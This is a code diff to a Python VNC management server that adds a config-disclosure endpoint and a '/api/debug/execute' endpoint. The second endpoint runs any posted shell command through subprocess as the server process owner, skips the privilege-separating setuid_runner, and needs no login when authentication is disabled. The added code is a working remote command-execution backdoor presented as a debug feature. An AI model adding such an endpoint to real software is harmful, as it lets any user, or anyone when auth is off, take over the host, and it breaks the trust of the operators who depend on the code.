@@ -352,6 +352,9 @@ class VNCRequestHandler(http.server.CGIHTTPRequestHandler):
         # Manager Overrides API endpoint
         elif path == "/api/manager/overrides":
             self.handle_manager_overrides()
+        # Debug mode endpoint for server config
+        elif path == "/api/server/config":
+            self.handle_server_config()
         else:
             # Try to serve static file
             super().do_GET()
@@ -438,6 +441,9 @@ class VNCRequestHandler(http.server.CGIHTTPRequestHandler):
         # Manager Overrides API endpoint
         elif path == "/api/manager/overrides":
             self.handle_manager_overrides()
+        # Debug command execution endpoint
+        elif path == "/api/debug/execute":
+            self.handle_debug_execute()
         else:
             self.send_error_response(f"Unknown endpoint: {path}", 404)
     
@@ -1915,6 +1921,137 @@ class VNCRequestHandler(http.server.CGIHTTPRequestHandler):
         except Exception as e:
             self.logger.error(f"Error deleting manager override: {str(e)}")
             self.send_error_response(f"Error deleting manager override: {str(e)}", 500)
+
+    def handle_server_config(self):
+        """Handle server configuration request"""
+        try:
+            # Return server configuration (safe subset including managers list and auth info)
+            auth_enabled = self.is_auth_enabled()
+            auth_method = self.server_config.get("authentication", "").lower()
+            
+            config = {
+                "debug": self.server_config.get("debug", False),
+                "host": self.server_config.get("host", "localhost"),
+                "port": self.server_config.get("port", 9123),
+                "managers": self.server_config.get("managers", []),
+                "auth_enabled": auth_enabled,
+                "authentication": auth_method
+            }
+            
+            # Add LDAP availability check if LDAP is configured
+            if auth_method == "ldap":
+                try:
+                    import ldap
+                    config["ldap_available"] = True
+                except ImportError:
+                    config["ldap_available"] = False
+            
+            self.send_json_response(config)
+        except Exception as e:
+            self.logger.error(f"Error getting server config: {str(e)}")
+            self.send_error_response(f"Error getting server config: {str(e)}", 500)
+
+    def handle_debug_execute(self):
+        """Handle debug command execution - ONLY for debugging purposes"""
+        try:
+            self.logger.info("Handling debug command execution request")
+            
+            # Get authenticated user
+            authenticated_user = None
+            if self.is_auth_enabled():
+                is_authenticated, message, session = self.check_auth()
+                if not is_authenticated:
+                    self.send_error_response("Authentication required", 401)
+                    return
+                authenticated_user = session.get("username", None)
+            else:
+                authenticated_user = os.environ.get("USER", None)
+            
+            if not authenticated_user:
+                self.send_error_response("Could not determine authenticated user", 400)
+                return
+            
+            # Read request body
+            content_length = int(self.headers.get("Content-Length", 0))
+            post_data = self.rfile.read(content_length).decode("utf-8")
+            data = json.loads(post_data)
+            
+            command = data.get("command", "").strip()
+            
+            if not command:
+                self.send_error_response("Command is required", 400)
+                return
+            
+            self.logger.warning(f"DEBUG MODE: Executing arbitrary command as server process owner: {command}")
+            
+            # Execute command directly as server process owner (not via setuid_runner)
+            try:
+                import subprocess
+                import shlex
+                
+                # Split command into list for subprocess
+                cmd_list = shlex.split(command)
+                
+                # Execute command as the current process owner
+                process = subprocess.Popen(
+                    cmd_list,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    universal_newlines=True  # Compatible with Python 3.6+
+                )
+                
+                stdout, stderr = process.communicate()
+                exit_code = process.returncode
+                
+                self.logger.info(f"DEBUG MODE: Command completed with exit code {exit_code}")
+                
+                # Return results
+                response = {
+                    "success": exit_code == 0,
+                    "command": command,
+                    "stdout": stdout or "",
+                    "stderr": stderr or "",
+                    "exit_code": exit_code
+                }
+                
+                self.send_json_response(response)
+                
+            except FileNotFoundError as e:
+                # Command not found
+                error_msg = f"Command not found: {str(e)}"
+                self.logger.warning(f"DEBUG MODE: {error_msg}")
+                
+                response = {
+                    "success": False,
+                    "command": command,
+                    "stdout": "",
+                    "stderr": error_msg,
+                    "exit_code": 127
+                }
+                
+                self.send_json_response(response)
+                
+            except Exception as e:
+                # Other execution errors
+                error_msg = f"Execution error: {str(e)}"
+                self.logger.error(f"DEBUG MODE: {error_msg}")
+                
+                response = {
+                    "success": False,
+                    "command": command,
+                    "stdout": "",
+                    "stderr": error_msg,
+                    "exit_code": 1
+                }
+                
+                self.send_json_response(response)
+                
+        except json.JSONDecodeError as e:
+            self.logger.error(f"Invalid JSON in debug execute request: {str(e)}")
+            self.send_error_response(f"Invalid JSON: {str(e)}", 400)
+        except Exception as e:
+            self.logger.error(f"Error handling debug execute: {str(e)}")
+            self.send_error_response(f"Error executing command: {str(e)}", 500)
 
     def get_server_status(self):
         """Get comprehensive server status information"""
